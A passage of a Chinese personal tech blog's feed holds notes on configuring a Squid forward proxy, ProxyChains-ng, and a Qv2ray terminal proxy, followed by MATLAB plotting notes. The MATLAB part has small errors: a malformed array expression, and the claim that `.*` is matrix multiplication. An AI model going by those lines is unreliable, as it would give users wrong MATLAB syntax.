    <content type="html"><![CDATA[<p><a href="https://www.bilibili.com/video/BV1q5411Y7MW/?spm_id_from=trigger_reload&vd_source=bc8ddbb1a08707dc809c3fd9bb85290d">参考</a></p><p>似乎私有 IP 可以随意分配, 是自己可控的. 只有公网 IP 才是由别人分配的.</p><p>三个上网的条件:</p><ul><li>IP</li><li>Gateway</li><li>DNS</li></ul><p>内网中的主机若是想用一台外网的具有公网 IP 的主机作为正向代理服务器, 需要先搭 VPN 实现内网穿透.</p><h1 id="配置网卡"><a href="#配置网卡" class="headerlink" title="配置网卡"></a>配置网卡</h1><p>Ubuntu 的路径为 <code>/etc/netplan/</code> 目录下, docker 容器中无此路径.</p><p>CentOS 的路径为 <code>/etc/sysconfig/network-scripts/</code> 目录下.</p><p>需要测试是否能够上网, 代理服务器是需要连网的.</p><h1 id="安装-squid"><a href="#安装-squid" class="headerlink" title="安装 squid"></a>安装 squid</h1><p>Ubuntu 下可直接:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ apt-get install squid<br></code></pre></td></tr></table></figure><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>配置文件位于 <code>/etc/squid/squid.conf</code>.</p><p>重启服务 <code>systemctl restart squid</code>.</p><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p><a href="https://blog.csdn.net/qq_37367124/article/details/88241940">参考</a></p><p>Ubuntu 中位于 1188 行.</p><p>配置文件中命令 <code>acl</code> 的含义是 Access Control List. 其用来在服务器端设定特定的上网策略, 哪些用户能上网, 能访问什么网站, 能下载什么文件等等对用户的上网行为进行约束和管理.</p><p>ACL 由多个策略规则组成, 它可以根据指定的策略规则来允许或限制访问请求, 匹配顺序由上至下. 一旦形成匹配, 则立即执行相应操作并结束匹配过程.</p><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>可以用 <code>acl</code> 创建变量:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">acl</span> allow_user src <span class="hljs-number">192.168.10.1</span>-<span class="hljs-number">192.168.10.50</span><br></code></pre></td></tr></table></figure><p>这里命名了一个 <code>allow_user</code> 的变量, 地址范围为 192.168.10.1-192.168.10.50.</p><p>访问控制:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http_access</span> <span class="hljs-literal">allow</span> allow_user<br><span class="hljs-attribute">http_access</span> <span class="hljs-literal">deny</span> <span class="hljs-literal">all</span><br></code></pre></td></tr></table></figure><p>允许 <code>allow_user</code> 规定的用户进行 http 访问, 拒绝其他链接的访问.</p><h3 id="配置客户端的正向代理"><a href="#配置客户端的正向代理" class="headerlink" title="配置客户端的正向代理"></a>配置客户端的正向代理</h3><p>不同客户端的配置不同.</p><p>通过 <code>netstat -ntpl</code> 查看 squid 开启的默认端口, 也可通过查看其配置文件.</p><p>通用配置, 指定内网网卡的地址, 以及 squid 的端口.</p><h3 id="Squid-访问控制"><a href="#Squid-访问控制" class="headerlink" title="Squid 访问控制"></a>Squid 访问控制</h3>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于-sysctl.conf-这个文件</title>
    <link href="/2022/10/16/%E5%85%B3%E4%BA%8E-sysctl.conf-%E8%BF%99%E4%B8%AA%E6%96%87%E4%BB%B6/"/>
    <url>/2022/10/16/%E5%85%B3%E4%BA%8E-sysctl.conf-%E8%BF%99%E4%B8%AA%E6%96%87%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>什么是-ProxyChains</title>
    <link href="/2022/10/16/%E4%BB%80%E4%B9%88%E6%98%AF-ProxyChains/"/>
    <url>/2022/10/16/%E4%BB%80%E4%B9%88%E6%98%AF-ProxyChains/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wizardforcel.gitbooks.io/daxueba-kali-linux-tutorial/content/11.html">参考1</a><br><a href="https://blog.csdn.net/freeking101/article/details/70324802">参考2</a><br><a href="https://github.com/haad/proxychains/wiki">proxychains 的 github 主页</a><br><a href="https://github.com/rofl0r/proxychains-ng">proxychains-ng 的 github 主页</a></p><p>ProxyChains 是 Linux 和其他 Unix 系统下的代理工具, 可以使任何程序通过代理上网.</p><p>主要是为了在命令行使用代理.</p><p>ProxyChains 可以配置多个代理. </p><p>proxychains-ng (new generation) 是 proxychains 的升级版.</p><p>ProxyChains 只会将当前应用的 TCP 连接转发至代理, 而非全局代理.</p><h1 id="安装-proxychains-ng"><a href="#安装-proxychains-ng" class="headerlink" title="安装 proxychains-ng"></a>安装 proxychains-ng</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ git <span class="hljs-built_in">clone</span> https://github.com/rofl0r/proxychains-ng<br>$ <span class="hljs-built_in">cd</span> proxychains-ng<br>$ ./configure<br>$ sudo make &amp;&amp; make install<br></code></pre></td></tr></table></figure><p>其实可以直接用包管理器下载:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ apt-get install proxychains-ng<br></code></pre></td></tr></table></figure><h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>配置文件位于: <code>/etc/proxychains.conf</code>.</p><p>先取消 <code>dynamic_chain</code> 前面的注释</p><p>在末尾添加添加一些代理服务器列表:</p><p>如:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span> <span class="hljs-number">127.0.0.1</span> <span class="hljs-number">6889</span><br><span class="hljs-attribute">socket4</span> <span class="hljs-number">127.0.0.1</span> <span class="hljs-number">9050</span><br><span class="hljs-attribute">socket5</span> <span class="hljs-number">98.206.2.3</span> <span class="hljs-number">1893</span><br></code></pre></td></tr></table></figure><h1 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h1><p>在命令前加上 <code>proxychain4</code>, 如:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ proxychains4 git <span class="hljs-built_in">clone</span> https://github.com/rofl0r/proxychains-ng<br></code></pre></td></tr></table></figure><p>由于 proxychains 只会代理 TCP 连接, 而 ping 命令使用的是 ICMP, 因此 ping 命令不会有效果.</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux-终端下的代理</title>
    <link href="/2022/10/16/Linux-%E7%BB%88%E7%AB%AF%E4%B8%8B%E7%9A%84%E4%BB%A3%E7%90%86/"/>
    <url>/2022/10/16/Linux-%E7%BB%88%E7%AB%AF%E4%B8%8B%E7%9A%84%E4%BB%A3%E7%90%86/</url>
    
    <content type="html"><![CDATA[<p><a href="https://b23.tv/IQEkOWW">参考</a></p><h1 id="Ubuntu-下配置"><a href="#Ubuntu-下配置" class="headerlink" title="Ubuntu 下配置"></a>Ubuntu 下配置</h1><p>使用 Q2ray, 是一个 Qt5 的界面.</p><p><a href="https://github.com/Qv2ray/Qv2ray">Github 界面</a>, 最新版在 release 中. 下载 AppImage 版本:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ wget https://github.com/Qv2ray/Qv2ray/releases/download/v2.7.0/Qv2ray-v2.7.0-linux-x64.AppImage<br></code></pre></td></tr></table></figure><p>这个文件是可执行文件, 需提供可执行权限:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">chmod</span> u+x file<br></code></pre></td></tr></table></figure><p>其配置文件在 <code>~/.config/qv2ray</code> 中.</p><p>之后在 <code>~/.config/qv2ray</code> 下创建 <code>vcore</code> 文件夹:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">mkdir</span> vcore<br></code></pre></td></tr></table></figure><p>之后在官网下下载 <code>vcore</code> 的内容:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ wget https://github.com/v2fly/v2ray-core/releases/download/v5.1.0/v2ray-linux-64.zip<br></code></pre></td></tr></table></figure><p>将其解压到 <code>~/.config/qv2ray/vcore</code> 下.</p><p>之后在图形界面下配置, 还需要添加节点.</p><p>可在浏览器中访问 <a href="ipv4.icanhazip.com"><code>ipv4.icanhazip.com</code></a> 这个网站, 用于获取本机的 IPv4 地址. </p><p>也可以直接用 <code>curl</code> 命令:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ curl ipv4.icanhazip.com<br></code></pre></td></tr></table></figure><p>其返回值就是.</p><p>修改终端的代理配置需要安装 <code>proxychains</code>, 其配置文件位于 <code>/etc/</code> 下.</p><p>添加如:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span> <span class="hljs-number">127.0.0.1</span> <span class="hljs-number">8889</span><br></code></pre></td></tr></table></figure><p>这里设置时, <code>qv2ray</code> 设置的端口和系统设置的端口需要一直.</p><p>可以测试:</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">proxychai<span class="hljs-symbol">ns4</span> curl www.google.com<br></code></pre></td></tr></table></figure><p>使用 <code>ping</code> 命令是无法向外网服务器发送数据包, 使用 <code>curl</code> 有返回值.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>st-使用的字体</title>
    <link href="/2022/10/16/st-%E4%BD%BF%E7%94%A8%E7%9A%84%E5%AD%97%E4%BD%93/"/>
    <url>/2022/10/16/st-%E4%BD%BF%E7%94%A8%E7%9A%84%E5%AD%97%E4%BD%93/</url>
    
    <content type="html"><![CDATA[<p>不知道出处了这张:<br><img src="/../img/st_%E5%AD%97%E4%BD%93.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Matlab-增加小刻度</title>
    <link href="/2022/10/15/Matlab-%E5%A2%9E%E5%8A%A0%E5%B0%8F%E5%88%BB%E5%BA%A6/"/>
    <url>/2022/10/15/Matlab-%E5%A2%9E%E5%8A%A0%E5%B0%8F%E5%88%BB%E5%BA%A6/</url>
    
    <content type="html"><![CDATA[<p>使用 <code>xticks</code> 和 <code>yticks</code>.</p>]]></content>
    
    
    <categories>
      
      <category>Matlab</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>向-matlab-图中添加文本</title>
    <link href="/2022/10/15/%E5%90%91-matlab-%E5%9B%BE%E4%B8%AD%E6%B7%BB%E5%8A%A0%E6%96%87%E6%9C%AC/"/>
    <url>/2022/10/15/%E5%90%91-matlab-%E5%9B%BE%E4%B8%AD%E6%B7%BB%E5%8A%A0%E6%96%87%E6%9C%AC/</url>
    
    <content type="html"><![CDATA[<p><a href="https://ww2.mathworks.cn/help/matlab/creating_plots/add-text-to-specific-points-on-graph.html">参考</a><br>使用 <code>text</code> 命令.</p>]]></content>
    
    
    <categories>
      
      <category>Matlab</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Matlab-揭秘-Notes</title>
    <link href="/2022/10/15/Matlab-%E6%8F%AD%E7%A7%98-Notes/"/>
    <url>/2022/10/15/Matlab-%E6%8F%AD%E7%A7%98-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="第一章-MATLAB-环境"><a href="#第一章-MATLAB-环境" class="headerlink" title="第一章 MATLAB 环境"></a>第一章 MATLAB 环境</h1><p>基本运算符号, 包括: <code>+</code>, <code>-</code>, <code>*</code>, <code>/</code>.</p><p>幂 <code>^</code>.</p><p>赋值 <code>=</code>.</p><p>多个表达式卸载同一行, 用 <code>;</code> 分隔表达式.</p><p>用 <code>who</code> 显示变量. <code>whos</code> 得到更多信息.</p><p><code>clear</code> 清除变量.</p><p>行尾加 <code>...</code> 可以续行.</p><p>MATLAB 默认精度为 short, 输出小数点后 4 位. 可用 <code>format</code> 命令修改:</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">format</span> <span class="hljs-keyword">long</span><br></code></pre></td></tr></table></figure><p><code>long</code> 为十六位.</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">format</span> bank<br></code></pre></td></tr></table></figure><p>两位.</p><p>科学计数法:</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">format</span> <span class="hljs-keyword">short</span> e<br></code></pre></td></tr></table></figure><p>返回最接近的比例式:</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">format</span> rat<br></code></pre></td></tr></table></figure><h2 id="基本数学定义式"><a href="#基本数学定义式" class="headerlink" title="基本数学定义式"></a>基本数学定义式</h2><p>使用 $\pi$, 只需要输入 <code>pi</code>.</p><p>自然常数 $e$, 输入 <code>exp(1)</code>.</p><p>得到平方根: <code>sqrt()</code>.</p><p>自然对数:  <code>log()</code>, 以 10 为底: <code>log10()</code>.</p><p>三角函数和反三角函数: <code>cos()</code>, <code>acos()</code>.</p><p>复数形式: <code>z=x+yi</code></p><h2 id="文件基础"><a href="#文件基础" class="headerlink" title="文件基础"></a>文件基础</h2><p><code>%</code> 是注释.</p><p>数组, 元素用 <code>:</code> 或 <code>;</code> 分开: <code>x = [1:2:3:4] ; y = exp(x)</code>, 输出为四个.</p><h2 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h2><p>输入 <code>quit</code>.</p><h1 id="第二章-向量与矩阵"><a href="#第二章-向量与矩阵" class="headerlink" title="第二章 向量与矩阵"></a>第二章 向量与矩阵</h1><h1 id="第三章-绘图与图形"><a href="#第三章-绘图与图形" class="headerlink" title="第三章 绘图与图形"></a>第三章 绘图与图形</h1><h2 id="2D-绘图基础"><a href="#2D-绘图基础" class="headerlink" title="2D 绘图基础"></a>2D 绘图基础</h2><p>三个步骤:<br>    1. 定义函数<br>    2. 指定要绘制的函数图形的值范围<br>    3. 调用 MATLAB 的 <code>plot(x, y)</code> 函数</p><p>指定函数的值的范围时, 需要指定增量. 格式:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">[ <span class="hljs-keyword">start</span> : <span class="hljs-type">interval</span> : <span class="hljs-keyword">end</span> ]<br></code></pre></td></tr></table></figure><p>如:</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-keyword">x</span> <span class="hljs-operator">=</span> [ <span class="hljs-number">0</span>:<span class="hljs-number">0.1</span>:<span class="hljs-number">10</span> ]<span class="hljs-comment">;</span><br>y <span class="hljs-operator">=</span> cos(<span class="hljs-keyword">x</span>)<span class="hljs-comment">;</span><br>plot(<span class="hljs-keyword">x</span><span class="hljs-punctuation">,</span> y)<br></code></pre></td></tr></table></figure><p>每行用 <code>;</code> 结尾可以抑制 MATLAB 的输出.</p><p>若要重新画图, 需要重新输入所有命令.</p><h3 id="添加坐标轴标签"><a href="#添加坐标轴标签" class="headerlink" title="添加坐标轴标签"></a>添加坐标轴标签</h3><p>添加坐标轴标签, 使用 <code>xlabel</code> 和 <code>ylabel</code>:</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gauss">x = [ <span class="hljs-number">0</span>:<span class="hljs-number">0.1</span>:<span class="hljs-number">10</span> ];<br>y = <span class="hljs-built_in">cos</span>(x);<br><span class="hljs-keyword">plot</span>(x, y), <span class="hljs-built_in">xlabel</span>(&#x27;x&#x27;), <span class="hljs-built_in">ylabel</span>(&#x27;<span class="hljs-built_in">cos</span>(x)&#x27;);<br></code></pre></td></tr></table></figure><h2 id="更多-2D-绘图选项"><a href="#更多-2D-绘图选项" class="headerlink" title="更多 2D 绘图选项"></a>更多 2D 绘图选项</h2><h3 id="在图像正上方打印标题"><a href="#在图像正上方打印标题" class="headerlink" title="在图像正上方打印标题"></a>在图像正上方打印标题</h3><p>在图像正上方打印标题, 使用 <code>title</code> 命令.</p><p>使用 <code>fplot</code> 可以避免如下报错:</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">??? <span class="hljs-built_in">Error</span> using =<span class="hljs-function">=&gt;</span> mtimes<br>Inner matrix dimensions must agree.<br></code></pre></td></tr></table></figure><p><code>fplot</code> 格式: <code>fplot(&#39;function string&#39;, [xstart, xend])</code></p><p>例:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">fplot</span><span class="hljs-params">(<span class="hljs-string">&#x27;exp(-2*t).*sin(t)&#x27;</span>, [<span class="hljs-number">0</span>, <span class="hljs-number">4</span>])</span></span>, <span class="hljs-built_in">xlabel</span>(<span class="hljs-string">&#x27;t&#x27;</span>), <span class="hljs-built_in">ylabel</span>(<span class="hljs-string">&#x27;f(t)&#x27;</span>), <span class="hljs-built_in">title</span>(<span class="hljs-string">&#x27;Name&#x27;</span>)<br></code></pre></td></tr></table></figure><p>注意, 当一个函数是由两个或更多函数相乘构成, 需要在相乘时加上 “.” 来告诉 MATLAB 是对两个矩阵相乘. 即 <code>.*</code> 表示矩阵相乘.</p><h3 id="给图像添加网格"><a href="#给图像添加网格" class="headerlink" title="给图像添加网格"></a>给图像添加网格</h3><p>使用 <code>grid on</code>:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">plot</span><span class="hljs-params">(x,y)</span></span>, <span class="hljs-attribute">grid</span> on<br></code></pre></td></tr></table></figure><h3 id="调整坐标轴"><a href="#调整坐标轴" class="headerlink" title="调整坐标轴"></a>调整坐标轴</h3><p><code>axis square</code> 产生正方形图像.</p><p><code>axis equal</code> 产生一个两坐标轴比例和间距都相同的图像.</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">plot</span><span class="hljs-params">(x,y)</span></span>, <span class="hljs-attribute">grid</span> on, axis equal<br></code></pre></td></tr></table></figure><h2 id="在同一图像中显示多个函数"><a href="#在同一图像中显示多个函数" class="headerlink" title="在同一图像中显示多个函数"></a>在同一图像中显示多个函数</h2><p>同样调用 <code>plot(x,y)</code> 函数, 两两成对, 后一个参数可表示曲线风格:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">plot</span><span class="hljs-params">(t,f,t,g,<span class="hljs-string">&#x27;--&#x27;</span>)</span></span><br></code></pre></td></tr></table></figure><p>风格包括:</p><ul><li>实线 <code>-</code></li><li>虚线 <code>--</code></li><li>虚点线 <code>-.</code></li><li>点线 <code>.</code></li></ul><h2 id="添加图例"><a href="#添加图例" class="headerlink" title="添加图例"></a>添加图例</h2><p>图例, 即告诉读者这个曲线是什么.</p><p>使用 <code>legend</code> 命令并跟在 <code>plot(x,y)</code> 之后:</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">legend(&#x27;sinh(<span class="hljs-name">x</span>)&#x27;,&#x27;cosh(<span class="hljs-name">x</span>)&#x27;)<br></code></pre></td></tr></table></figure><p>如:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">plot</span><span class="hljs-params">(x,y,x,z,<span class="hljs-string">&#x27;-.&#x27;</span>)</span></span>, <span class="hljs-built_in">xlabel</span>(<span class="hljs-string">&#x27;x&#x27;</span>), <span class="hljs-built_in">ylabel</span>(<span class="hljs-string">&#x27;Potential&#x27;</span>), <span class="hljs-selector-tag">legend</span>(<span class="hljs-string">&#x27;sinh(x)&#x27;</span>,<span class="hljs-string">&#x27;cosh(x)&#x27;</span>)<br></code></pre></td></tr></table></figure><p>可用鼠标拖动图例.<br><img src="/../img/show_what_fn_mean.png"></p><h3 id="修改曲线颜色"><a href="#修改曲线颜色" class="headerlink" title="修改曲线颜色"></a>修改曲线颜色</h3><p>红色为 <code>r</code> (red), 蓝色为 <code>b</code> (blue):</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">plot</span><span class="hljs-params">(x,y,<span class="hljs-string">&#x27;r&#x27;</span>,x,z,<span class="hljs-string">&#x27;b&#x27;</span>)</span></span><br></code></pre></td></tr></table></figure><p>或:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">plot</span><span class="hljs-params">(x,y,<span class="hljs-string">&#x27;r&#x27;</span>,x,z,<span class="hljs-string">&#x27;b--&#x27;</span>)</span></span><br></code></pre></td></tr></table></figure><p>有八种颜色:<br><img src="/../img/eight_colors_of_matlab.png"></p><h2 id="设置坐标比例"><a href="#设置坐标比例" class="headerlink" title="设置坐标比例"></a>设置坐标比例</h2><p>调用 <code>axis</code> 命令. 格式为:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">axis</span><span class="hljs-params">( [xmin xmax ymin ymax] )</span></span><br></code></pre></td></tr></table></figure><p>如:</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-keyword">x</span> <span class="hljs-operator">=</span> [<span class="hljs-number">0</span>:<span class="hljs-number">0.01</span>:<span class="hljs-number">5</span>]<span class="hljs-comment">;</span><br>y <span class="hljs-operator">=</span> sin(<span class="hljs-number">2</span>*<span class="hljs-keyword">x</span> + <span class="hljs-number">3</span>)<span class="hljs-comment">;</span><br>plot(<span class="hljs-keyword">x</span><span class="hljs-punctuation">,</span>y)<span class="hljs-punctuation">,</span> axis([<span class="hljs-number">0</span> <span class="hljs-number">5</span> <span class="hljs-number">-1</span> <span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure><h3 id="将函数平方"><a href="#将函数平方" class="headerlink" title="将函数平方"></a>将函数平方</h3><p>使用 <code>.^</code>:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">y</span> = sin(<span class="hljs-number">5</span>*x).^<span class="hljs-number">2</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h2 id="子图"><a href="#子图" class="headerlink" title="子图"></a>子图</h2><p>即一个图上显示多于一个图像.</p><p>使用 <code>subplot(m,n,p)</code> 命令. <code>m</code> 和 <code>n</code> 告诉 MATLAB 产生的子图有 <code>m</code> 行和 <code>n</code> 列 (指窗格块). <code>p</code> 用来告诉 MATLAB 我们所要贴上去的某个已经绘制的图形窗口 (也就是说下一个绘制的图像是放在第几列).</p><p>如:</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gauss">x = [<span class="hljs-number">0</span>:<span class="hljs-number">0.01</span>:<span class="hljs-number">5</span>];<br>y = <span class="hljs-built_in">exp</span>(<span class="hljs-number">-1.2</span>*x).*<span class="hljs-built_in">sin</span>(<span class="hljs-number">20</span>*x);<br><span class="hljs-built_in">subplot</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>);<br><span class="hljs-keyword">plot</span>(x,y), <span class="hljs-built_in">xlabel</span>(&#x27;x&#x27;), <span class="hljs-built_in">ylabel</span>(&#x27;<span class="hljs-built_in">exp</span>(<span class="hljs-number">-1.2</span>*x).*<span class="hljs-built_in">sin</span>(<span class="hljs-number">20</span>*x)&#x27;), <span class="hljs-built_in">axis</span>([<span class="hljs-number">0</span> <span class="hljs-number">5</span> <span class="hljs-number">-1</span> <span class="hljs-number">1</span>])<br><br>y = <span class="hljs-built_in">exp</span>(<span class="hljs-number">-2</span>*x).*<span class="hljs-built_in">sin</span>(<span class="hljs-number">20</span>*x);<br><span class="hljs-built_in">subplot</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)<br><span class="hljs-keyword">plot</span>(x,y), <span class="hljs-built_in">xlabel</span>(&#x27;x&#x27;), <span class="hljs-built_in">ylabel</span>(&#x27;<span class="hljs-built_in">exp</span>(<span class="hljs-number">-2</span>*x).*<span class="hljs-built_in">sin</span>(<span class="hljs-number">20</span>*x)&#x27;), <span class="hljs-built_in">axis</span>([<span class="hljs-number">0</span> <span class="hljs-number">5</span> <span class="hljs-number">-1</span> <span class="hljs-number">1</span>])<br><br></code></pre></td></tr></table></figure><p>结果:<br><img src="/../img/subplot_two_graph.png"></p><h2 id="图像重叠和-linspace-命令"><a href="#图像重叠和-linspace-命令" class="headerlink" title="图像重叠和 linspace 命令"></a>图像重叠和 linspace 命令</h2><p>先绘制了一个图像, 又决定在同一个图形上再绘制另一个函数的图像.</p><p>用 <code>linspace</code> 命令产生数集, 格式:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">x = <span class="hljs-built_in">linspace</span>(<span class="hljs-selector-tag">a</span>,<span class="hljs-selector-tag">b</span>,n)<br></code></pre></td></tr></table></figure><p>表示在 a 到 b 之间取 n 个点. 没有 n 时均匀取出 100 个.</p><p>如:</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs matlab">x = <span class="hljs-built_in">linspace</span>(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>*<span class="hljs-built_in">pi</span>);<br><span class="hljs-built_in">plot</span>(x,<span class="hljs-built_in">cos</span>(x))<br></code></pre></td></tr></table></figure><p>同时绘制两个图像, 使用 <code>hold on</code>:</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs matlab">x = <span class="hljs-built_in">linspace</span>(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>*<span class="hljs-built_in">pi</span>);<br><span class="hljs-built_in">plot</span>(x,<span class="hljs-built_in">cos</span>(x))<br><span class="hljs-built_in">hold</span> on <br><span class="hljs-built_in">plot</span>(x, <span class="hljs-built_in">sin</span>(x)), axis([<span class="hljs-number">0</span> <span class="hljs-number">2</span>*<span class="hljs-built_in">pi</span> <span class="hljs-number">-1</span> <span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure><h2 id="极坐标和对数图像"><a href="#极坐标和对数图像" class="headerlink" title="极坐标和对数图像"></a>极坐标和对数图像</h2><h2 id="离散数据绘图"><a href="#离散数据绘图" class="headerlink" title="离散数据绘图"></a>离散数据绘图</h2><p>使用 <code>plot(x,y)</code> 绘制一些离散数据图并用线连接起来.</p><p>先创建数组, 由于不是对连续函数进行建模, 因此没有必要指定增量.</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">x</span> = [<span class="hljs-number">1</span>:<span class="hljs-number">5</span>]<span class="hljs-comment">;</span><br><span class="hljs-attr">y</span> = [<span class="hljs-number">50</span>, <span class="hljs-number">98</span>, <span class="hljs-number">75</span>, <span class="hljs-number">80</span>, <span class="hljs-number">98</span>]<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>用条形图绘制, 使用 <code>bar(x,y)</code> 函数.</p><p>绘制针头图, 使用 <code>stem</code>.</p>]]></content>
    
    
    <categories>
      
      <category>Matlab</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>查看-qq-邮箱的-IMAP-地址</title>
